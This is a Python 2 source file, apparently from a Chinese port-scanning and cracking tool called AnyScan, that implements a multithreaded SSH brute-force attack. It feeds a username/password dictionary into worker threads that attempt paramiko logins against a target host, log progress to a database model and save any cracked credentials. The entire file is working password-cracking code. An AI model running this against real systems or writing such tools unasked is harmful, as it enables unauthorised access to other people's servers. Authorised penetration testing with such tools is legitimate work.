# -*- coding: utf-8 -*-

"""
 * Copyright(C) Anyuntec 2017.
 *
 * ssh攻击
 *
 * @author margin 2017/02/17.
 *
 * @version V1.00.
 *
 * 更新履历： V1.00 2017/02/17 margin 创建.
 *
 """
from AttackBase import AttackBase
from AttackObject import AttackObject
import threading,traceback,Queue,paramiko
from AnyScanUI.models import PortCrack
from AnyScanUI.util import currenttime
import datetime,json,time,sys

class SSHAttack(AttackBase):

    def __init__(self,attackOjbect):
        super(SSHAttack, self).__init__(attackOjbect)

    def attack(self):
        """
        SSH爆破类
        """
        result = {"status":True,"msg":"正在破解"}
        try:
            # 获取线程数
            threads = self.attackOjbect.getThreads()
            # 生成字典对应的queue
            attack_queue_result = self.attack_queue()
            self.attackOjbect.attack_queue_size = attack_queue_result["data"].qsize()
            if attack_queue_result["status"]:
                self.attackOjbect.attack_queue = attack_queue_result["data"]
            else:
                return attack_queue_result
            print "共并发【%s】个线程" % threads
            for index in range(0,threads):
                attacker = Attacker(self.attackOjbect)
                attacker.start()
        except Exception:
            print traceback.format_exc()
            result = {"status":False,"msg":traceback.format_exc()}
            return result

class Attacker(threading.Thread):
    """
    SSH爆破类
    """
    attackObject = AttackObject()
    def __init__(self,attackObject):
        #注意：一定要显式的调用父类的初始化函数。
        super(Attacker, self).__init__()
        self.attackObject = attackObject

    def run(self):

        reload(sys)
        sys.setdefaultencoding('utf8')
        ip_ = self.attackObject.getIp()
        port_ = self.attackObject.getPort()
        attack_queue = self.attackObject.getAttack_queue()
        while attack_queue.empty() is False:
            up_ = self.attackObject.getAttack_queue().get()
            username_ = up_[0]
            password_ = up_[1]
            # 计算进度
            c_size = self.attackObject.getAttack_queue_current_size()
            o_size = self.attackObject.getAttack_queue_size()
            progress = 1-float(format(float(c_size)/float(o_size),'.4f'))
            progress = '%.2f%%' % (progress * 100)
            param = ("SSH",progress,username_,password_)
            # 读取log日志
            log = self.attackObject.getLog(param)
            # 更新日志数据
            PortCrack.objects.filter(id=self.attackObject.getId()).update(end_time=currenttime(),type="SSH",progress=str(progress),log=str(log))
            # 如果连接成功，说明用户名密码正确
            if self.connect(ip_,username_,password_):
                # 清空队列
                self.attackObject.attack_queue.queue.clear()
                # 让该线程暂停1秒，保证该数据最后更新。
                time.sleep(1)
                # 先查询数据，然后将里面的数据进行更新
                attack_result = []
                obj = PortCrack.objects.get(id=self.attackObject.getId())
                will_update = {"ip":str(ip_),"port":port_,"username":username_,"password":password_}
                # 判断数据库中是否已经有了破解信息
                if obj.result is None or obj.result == "":
                    attack_result = [will_update]
                else:
                    attack_result = json.loads(obj.result)
                    attack_result.append(will_update)
                PortCrack.objects.filter(id=self.attackObject.getId()).update(end_time=currenttime(),status="success",result=str(attack_result),log=self.attackObject.getSuccessLog(("SSH",username_,password_)))

    def connect(self,host,username,password):
        """
        ssh连接
        :param host:
        :param username:
        :param password:
        :return:
        """
        ssh=paramiko.SSHClient()
        try:
            #print username+':'+password+'开始时间======》' + str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'))
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(hostname=host,username=username,password=password,timeout=0.2)
            return True
        except:
            #print username+':'+password+'结束时间======》' + str(datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S.%f'))
            return False
        finally:
            ssh.close()